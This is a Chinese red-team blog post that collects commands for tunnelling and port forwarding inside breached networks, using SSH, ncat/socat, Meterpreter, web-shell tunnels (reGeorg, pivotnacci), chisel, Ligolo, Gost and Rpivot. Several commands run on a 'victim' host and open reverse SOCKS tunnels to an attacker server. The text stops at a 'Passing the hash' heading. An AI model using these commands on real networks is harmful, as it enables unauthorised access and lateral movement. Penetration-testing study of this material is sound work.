<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 6.2.0">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/blog-32x32.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/blog-16x16.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">

<link rel="stylesheet" href="https://fonts.lug.ustc.edu.cn/css?family=Noto+Serif+SC:300,300italic,400,400italic,700,700italic%7CRoboto+Mono:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">

<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.0/css/all.min.css" integrity="sha256-AbA177XfpSnFEvgpYu1jMygiLabzPCJCRIBtR5jGc0k=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-minimal.css">
  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>

<script class="next-config" data-name="main" type="application/json">{"hostname":"l0n9w4y.cc","root":"/","images":"/images","scheme":"Mist","darkmode":true,"version":"8.13.0","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"default"},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>

    <meta name="description" content="本文总结内网穿透、端口转发思路及方法...">
<meta property="og:type" content="article">
<meta property="og:title" content="内网穿透姿势总结">
<meta property="og:url" content="https://l0n9w4y.cc/posts/11223/index.html">
<meta property="og:site_name" content="L0n9w4y">
<meta property="og:description" content="本文总结内网穿透、端口转发思路及方法...">
<meta property="og:locale" content="zh_CN">
<meta property="article:published_time" content="2021-07-18T14:24:13.000Z">
<meta property="article:modified_time" content="2022-10-25T13:51:00.189Z">
<meta property="article:author" content="L0n9w4y">
<meta property="article:tag" content="Linux">
<meta property="article:tag" content="Network Pivoting">
<meta property="article:tag" content="Port Forwarding">
<meta name="twitter:card" content="summary">


<link rel="canonical" href="https://l0n9w4y.cc/posts/11223/">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://l0n9w4y.cc/posts/11223/","path":"posts/11223/","title":"内网穿透姿势总结"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>内网穿透姿势总结 | L0n9w4y</title>
  






  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <p class="site-title">L0n9w4y</p>
      <i class="logo-line"></i>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-攻防"><a href="/A&D/" rel="section"><i class="fa fa-navicon fa-fw"></i>攻防</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
  </ul>
</nav>




</div>
        
  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>

  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00-%E5%9F%BA%E6%9C%AC%E6%8A%80%E5%B7%A7"><span class="nav-text">0x00 基本技巧</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E7%B1%BB%E5%9E%8B"><span class="nav-text">1. 类型</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-Listen-Listen"><span class="nav-text">2. Listen - Listen</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-Listen-Connect"><span class="nav-text">3. Listen - Connect</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-Connect-Connect"><span class="nav-text">4. Connect - Connect</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-SSH%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91"><span class="nav-text">0x01 SSH端口转发</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-SOCKS-Proxy"><span class="nav-text">1. SOCKS Proxy</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-Local-Port-Forwarding"><span class="nav-text">2. Local Port Forwarding</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-Remote-Port-Forwarding"><span class="nav-text">3. Remote Port Forwarding</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-Metasploit%E7%A9%BF%E9%80%8F"><span class="nav-text">0x02 Metasploit穿透</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-Graftcp"><span class="nav-text">0x03 Graftcp</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-Web-SOCKS"><span class="nav-text">0x04 Web SOCKS</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-reGeorg"><span class="nav-text">1. reGeorg</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-pivotnacci"><span class="nav-text">2. pivotnacci</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x05-Empire"><span class="nav-text">0x05 Empire</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x06-sshuttle"><span class="nav-text">0x06 sshuttle</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x07-chisel"><span class="nav-text">0x07 chisel</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x08-Ligolo"><span class="nav-text">0x08 Ligolo</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x09-Gost"><span class="nav-text">0x09 Gost</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x0A-Rpivot"><span class="nav-text">0x0A Rpivot</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x0B-revsocks"><span class="nav-text">0x0B revsocks</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x0C-plink"><span class="nav-text">0x0C plink</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x0D-ngrok"><span class="nav-text">0x0D ngrok</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x0E-cloudflared"><span class="nav-text">0x0E cloudflared</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x0F-%E6%B5%81%E9%87%8F%E6%8D%95%E8%8E%B7%E5%88%86%E6%9E%90"><span class="nav-text">0x0F 流量捕获分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-Windows-netsh"><span class="nav-text">1. Windows (netsh)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-Linux-tcpdump"><span class="nav-text">2. Linux (tcpdump)</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0xFF-Reference"><span class="nav-text">0xFF Reference</span></a></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="L0n9w4y"
      src="/images/hexo.png">
  <p class="site-author-name" itemprop="name">L0n9w4y</p>
  <div class="site-description" itemprop="description">攻防对抗，問道遠兮，求索未止...</div>
</div>
<div class="site-state-wrap site-overview-item animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">37</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
          <a href="/categories/">
        <span class="site-state-item-count">7</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
          <a href="/tags/">
        <span class="site-state-item-count">37</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author site-overview-item animated">
      <span class="links-of-author-item">
        <a href="https://github.com/L0n9w4y" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;L0n9w4y" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="https://weibo.com/l0n9w4y" title="Weibo → https:&#x2F;&#x2F;weibo.com&#x2F;l0n9w4y" rel="noopener" target="_blank"><i class="fab fa-weibo fa-fw"></i>Weibo</a>
      </span>
      <span class="links-of-author-item">
        <a href="https://twitter.com/_L0n9_" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;_L0n9_" rel="noopener" target="_blank"><i class="fab fa-twitter fa-fw"></i>Twitter</a>
      </span>
  </div>



        </div>
      </div>
        <div class="back-to-top animated" role="button" aria-label="返回顶部">
          <i class="fa fa-arrow-up"></i>
          <span>0%</span>
        </div>
    </div>
  </aside>
  <div class="sidebar-dimmer"></div>


    </header>

    
  <div class="reading-progress-bar"></div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://l0n9w4y.cc/posts/11223/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/hexo.png">
      <meta itemprop="name" content="L0n9w4y">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="L0n9w4y">
      <meta itemprop="description" content="攻防对抗，問道遠兮，求索未止...">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="内网穿透姿势总结 | L0n9w4y">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          内网穿透姿势总结
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2021-07-18 22:24:13" itemprop="dateCreated datePublished" datetime="2021-07-18T22:24:13+08:00">2021-07-18</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E7%BA%A2%E9%98%9F%E6%B8%97%E9%80%8F/" itemprop="url" rel="index"><span itemprop="name">红队渗透</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
        <center>本文总结内网穿透、端口转发思路及方法...</center>

<span id="more"></span>
<hr>
<h2 id="0x00-基本技巧"><a href="#0x00-基本技巧" class="headerlink" title="0x00 基本技巧"></a>0x00 基本技巧</h2><h3 id="1-类型"><a href="#1-类型" class="headerlink" title="1. 类型"></a>1. 类型</h3><table>
<thead>
<tr>
<th align="left">类型</th>
<th align="left">应用场景</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Listen - Listen</td>
<td align="left">对外暴露，不一定连接</td>
</tr>
<tr>
<td align="left">Listen - Connect</td>
<td align="left">常规转发</td>
</tr>
<tr>
<td align="left">Connect - Connect</td>
<td align="left">无法绑定，连接桥接两台主机</td>
</tr>
</tbody></table>
<h3 id="2-Listen-Listen"><a href="#2-Listen-Listen" class="headerlink" title="2. Listen - Listen"></a>2. Listen - Listen</h3><table>
<thead>
<tr>
<th align="left">类型</th>
<th align="left">用法</th>
</tr>
</thead>
<tbody><tr>
<td align="left">ncat</td>
<td align="left">ncat -v -l -p 8080 -c “ncat -v -l -p 9090”</td>
</tr>
<tr>
<td align="left">socat</td>
<td align="left">socat -v tcp-listen:8080 tcp-listen:9090</td>
</tr>
<tr>
<td align="left">remote host 1</td>
<td align="left">ncat localhost 8080 &lt; file</td>
</tr>
<tr>
<td align="left">remote host 2</td>
<td align="left">ncat localhost 9090 &gt; newfile</td>
</tr>
</tbody></table>
<h3 id="3-Listen-Connect"><a href="#3-Listen-Connect" class="headerlink" title="3. Listen - Connect"></a>3. Listen - Connect</h3><table>
<thead>
<tr>
<th align="left">类型</th>
<th align="left">用法</th>
</tr>
</thead>
<tbody><tr>
<td align="left">ncat</td>
<td align="left">ncat -l -v -p 8080 -c “ncat localhost 9090”</td>
</tr>
<tr>
<td align="left">socat</td>
<td align="left">socat -v tcp-listen:8080,reuseaddr tcp-connect:localhost:9090</td>
</tr>
<tr>
<td align="left">remote host 1</td>
<td align="left">ncat localhost -p 8080 &lt; file</td>
</tr>
<tr>
<td align="left">remote host 2</td>
<td align="left">ncat -l -p 9090 &gt; newfile</td>
</tr>
</tbody></table>
<h3 id="4-Connect-Connect"><a href="#4-Connect-Connect" class="headerlink" title="4. Connect - Connect"></a>4. Connect - Connect</h3><table>
<thead>
<tr>
<th align="left">类型</th>
<th align="left">用法</th>
</tr>
</thead>
<tbody><tr>
<td align="left">ncat</td>
<td align="left">ncat localhost 8080 -c “ncat localhost 9090”</td>
</tr>
<tr>
<td align="left">socat</td>
<td align="left">socat -v tcp-connect:localhost:8080,reuseaddr tcp-connect:localhost:9090</td>
</tr>
<tr>
<td align="left">remote host 1</td>
<td align="left">ncat -l -p 8080 &lt; file</td>
</tr>
<tr>
<td align="left">remote host 2</td>
<td align="left">ncat -l -p 9090 &gt; newfile</td>
</tr>
</tbody></table>
<h2 id="0x01-SSH端口转发"><a href="#0x01-SSH端口转发" class="headerlink" title="0x01 SSH端口转发"></a>0x01 SSH端口转发</h2><h3 id="1-SOCKS-Proxy"><a href="#1-SOCKS-Proxy" class="headerlink" title="1. SOCKS Proxy"></a>1. SOCKS Proxy</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ssh -D8080 [user]@[host]</span><br><span class="line"></span><br><span class="line">ssh -N -f -D 9000 [user]@[host]</span><br><span class="line"></span><br><span class="line">-f : ssh in background</span><br><span class="line">-N : do not execute a remote command</span><br></pre></td></tr></table></figure>

<h3 id="2-Local-Port-Forwarding"><a href="#2-Local-Port-Forwarding" class="headerlink" title="2. Local Port Forwarding"></a>2. Local Port Forwarding</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -L [bindaddr]:[port]:[dsthost]:[dstport] [user]@[host]</span><br></pre></td></tr></table></figure>

<h3 id="3-Remote-Port-Forwarding"><a href="#3-Remote-Port-Forwarding" class="headerlink" title="3. Remote Port Forwarding"></a>3. Remote Port Forwarding</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh -R [bindaddr]:[port]:[localhost]:[localport] [user]@[host]</span><br><span class="line">ssh -R 3389:10.1.1.224:3389 root@10.11.0.32</span><br></pre></td></tr></table></figure>

<h2 id="0x02-Metasploit穿透"><a href="#0x02-Metasploit穿透" class="headerlink" title="0x02 Metasploit穿透"></a>0x02 Metasploit穿透</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"># Meterpreter list active port forwards</span><br><span class="line">portfwd list </span><br><span class="line"></span><br><span class="line"># Forwards 3389 (RDP) to 3389 on the compromised machine running the Meterpreter shell</span><br><span class="line">portfwd add –l 3389 –p 3389 –r target-host </span><br><span class="line">portfwd add -l 88 -p 88 -r 127.0.0.1</span><br><span class="line">portfwd add -L 0.0.0.0 -l 445 -r 192.168.57.102 -p 445</span><br><span class="line"></span><br><span class="line"># Forwards 3389 (RDP) to 3389 on the compromised machine running the Meterpreter shell</span><br><span class="line">portfwd delete –l 3389 –p 3389 –r target-host </span><br><span class="line"># Meterpreter delete all port forwards</span><br><span class="line">portfwd flush </span><br><span class="line"></span><br><span class="line">or</span><br><span class="line"></span><br><span class="line"># Use Meterpreters autoroute script to add the route for specified subnet 192.168.15.0</span><br><span class="line">run autoroute -s 192.168.15.0/24 </span><br><span class="line">use auxiliary/server/socks_proxy</span><br><span class="line">set SRVPORT 9090</span><br><span class="line">set VERSION 4a</span><br><span class="line"># or</span><br><span class="line">use auxiliary/server/socks4a     # (deprecated)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># Meterpreter list all active routes</span><br><span class="line">run autoroute -p </span><br><span class="line"></span><br><span class="line">route #Meterpreter view available networks the compromised host can access</span><br><span class="line"># Meterpreter add route for 192.168.14.0/24 via Session number.</span><br><span class="line">route add 192.168.14.0 255.255.255.0 3 </span><br><span class="line"></span><br><span class="line"># Meterpreter delete route for 192.168.14.0/24 via Session number.</span><br><span class="line"></span><br><span class="line">route delete 192.168.14.0 255.255.255.0 3 </span><br><span class="line"></span><br><span class="line"># Meterpreter delete all routes</span><br><span class="line">route flush </span><br></pre></td></tr></table></figure>

<h2 id="0x03-Graftcp"><a href="#0x03-Graftcp" class="headerlink" title="0x03 Graftcp"></a>0x03 Graftcp</h2><p><strong>基本用法</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># Create a SOCKS5, using Chisel or another tool and forward it through SSH</span><br><span class="line">(attacker) $ ssh -fNT -i /tmp/id_rsa -L 1080:127.0.0.1:1080 root@IP_VPS</span><br><span class="line">(vps) $ ./chisel server --tls-key ./key.pem --tls-cert ./cert.pem -p 8443 -reverse </span><br><span class="line">(victim 1) $ ./chisel client --tls-skip-verify https://IP_VPS:8443 R:socks </span><br><span class="line"></span><br><span class="line"># Run graftcp and specify the SOCKS5</span><br><span class="line">(attacker) $ graftcp-local -listen :2233 -logfile /tmp/toto -loglevel 6 -socks5 127.0.0.1:1080</span><br><span class="line">(attacker) $ graftcp ./nuclei -u http://172.16.1.24</span><br></pre></td></tr></table></figure>

<p><strong>基础配置</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># https://github.com/hmgle/graftcp/blob/master/local/example-graftcp-local.conf</span><br><span class="line">## Listen address (default &quot;:2233&quot;)</span><br><span class="line">listen = :2233</span><br><span class="line">loglevel = 1</span><br><span class="line"></span><br><span class="line">## SOCKS5 address (default &quot;127.0.0.1:1080&quot;)</span><br><span class="line">socks5 = 127.0.0.1:1080</span><br><span class="line"># socks5_username = SOCKS5USERNAME</span><br><span class="line"># socks5_password = SOCKS5PASSWORD</span><br><span class="line"></span><br><span class="line">## Set the mode for select a proxy (default &quot;auto&quot;)</span><br><span class="line">select_proxy_mode = auto</span><br></pre></td></tr></table></figure>

<h2 id="0x04-Web-SOCKS"><a href="#0x04-Web-SOCKS" class="headerlink" title="0x04 Web SOCKS"></a>0x04 Web SOCKS</h2><h3 id="1-reGeorg"><a href="#1-reGeorg" class="headerlink" title="1. reGeorg"></a>1. reGeorg</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">python reGeorgSocksProxy.py -p 8080 -u http://host/shell.jsp # the socks proxy will be on port 8080</span><br><span class="line"></span><br><span class="line">optional arguments:</span><br><span class="line">  -h, --help           show this help message and exit</span><br><span class="line">  -l , --listen-on     The default listening address</span><br><span class="line">  -p , --listen-port   The default listening port</span><br><span class="line">  -r , --read-buff     Local read buffer, max data to be sent per POST</span><br><span class="line">  -u , --url           The url containing the tunnel script</span><br><span class="line">  -v , --verbose       Verbose output[INFO|DEBUG]</span><br></pre></td></tr></table></figure>

<h3 id="2-pivotnacci"><a href="#2-pivotnacci" class="headerlink" title="2. pivotnacci"></a>2. pivotnacci</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pip3 install pivotnacci</span><br><span class="line">pivotnacci  https://domain.com/agent.php --password &quot;s14r1t&quot;</span><br><span class="line">pivotnacci  https://domain.com/agent.php --polling-interval 2000</span><br></pre></td></tr></table></figure>

<h2 id="0x05-Empire"><a href="#0x05-Empire" class="headerlink" title="0x05 Empire"></a>0x05 Empire</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(Empire) &gt; socksproxyserver</span><br><span class="line">(Empire) &gt; use module management/invoke_socksproxy</span><br><span class="line">(Empire) &gt; set remoteHost 10.10.10.10</span><br><span class="line">(Empire) &gt; run</span><br></pre></td></tr></table></figure>

<h2 id="0x06-sshuttle"><a href="#0x06-sshuttle" class="headerlink" title="0x06 sshuttle"></a>0x06 sshuttle</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">pacman -Sy sshuttle</span><br><span class="line">apt-get install sshuttle</span><br><span class="line">sshuttle -vvr user@10.10.10.10 10.1.1.0/24</span><br><span class="line">sshuttle -vvr username@pivot_host 10.2.2.0/24 </span><br><span class="line"></span><br><span class="line"># using a private key</span><br><span class="line">$ sshuttle -vvr root@10.10.10.10 10.1.1.0/24 -e &quot;ssh -i ~/.ssh/id_rsa&quot; </span><br><span class="line"></span><br><span class="line"># -x == exclude some network to not transmit over the tunnel</span><br><span class="line"># -x x.x.x.x.x/24</span><br></pre></td></tr></table></figure>

<h2 id="0x07-chisel"><a href="#0x07-chisel" class="headerlink" title="0x07 chisel"></a>0x07 chisel</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">go get -v github.com/jpillora/chisel</span><br><span class="line"></span><br><span class="line"># forward port 389 and 88 to hacker computer</span><br><span class="line">user@hacker$ /opt/chisel/chisel server -p 8008 --reverse</span><br><span class="line">user@victim$ .\chisel.exe client YOUR_IP:8008 R:88:127.0.0.1:88 R:389:localhost:389 </span><br><span class="line"></span><br><span class="line"># SOCKS</span><br><span class="line">user@victim$ .\chisel.exe client YOUR_IP:8008 R:socks</span><br></pre></td></tr></table></figure>

<h2 id="0x08-Ligolo"><a href="#0x08-Ligolo" class="headerlink" title="0x08 Ligolo"></a>0x08 Ligolo</h2><p><strong>Build Ligolo</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># Get Ligolo and dependencies</span><br><span class="line">cd `go env GOPATH`/src</span><br><span class="line">git clone https://github.com/sysdream/ligolo</span><br><span class="line">cd ligolo</span><br><span class="line">make dep</span><br><span class="line"></span><br><span class="line"># Generate self-signed TLS certificates (will be placed in the certs folder)</span><br><span class="line">make certs TLS_HOST=example.com</span><br><span class="line"></span><br><span class="line">make build-all</span><br></pre></td></tr></table></figure>

<p><strong>Use Ligolo</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># On your attack server.</span><br><span class="line">./bin/localrelay_linux_amd64</span><br><span class="line"></span><br><span class="line"># On the compromise host.</span><br><span class="line">ligolo_windows_amd64.exe -relayserver LOCALRELAYSERVER:5555</span><br></pre></td></tr></table></figure>

<h2 id="0x09-Gost"><a href="#0x09-Gost" class="headerlink" title="0x09 Gost"></a>0x09 Gost</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/ginuerzh/gost</span><br><span class="line">cd gost/cmd/gost</span><br><span class="line">go build</span><br><span class="line"></span><br><span class="line"># Socks5 Proxy</span><br><span class="line">Server side: gost -L=socks5://:1080</span><br><span class="line">Client side: gost -L=:8080 -F=socks5://server_ip:1080?notls=true</span><br><span class="line"></span><br><span class="line"># Local Port Forward</span><br><span class="line">gost -L=tcp://:2222/192.168.1.1:22 [-F=..]</span><br></pre></td></tr></table></figure>

<h2 id="0x0A-Rpivot"><a href="#0x0A-Rpivot" class="headerlink" title="0x0A Rpivot"></a>0x0A Rpivot</h2><p><strong>Server (Attacker box)</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python server.py --proxy-port 1080 --server-port 9443 --server-ip 0.0.0.0</span><br></pre></td></tr></table></figure>

<p><strong>Client (Compromised box)</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python client.py --server-ip &lt;ip&gt; --server-port 9443</span><br></pre></td></tr></table></figure>

<p><strong>Through corporate proxy</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python client.py --server-ip [server ip] --server-port 9443 --ntlm-proxy-ip [proxy ip] \</span><br><span class="line">--ntlm-proxy-port 8080 --domain CORP --username jdoe --password 1q2w3e</span><br></pre></td></tr></table></figure>

<p><strong>Passing the hash</strong></p>
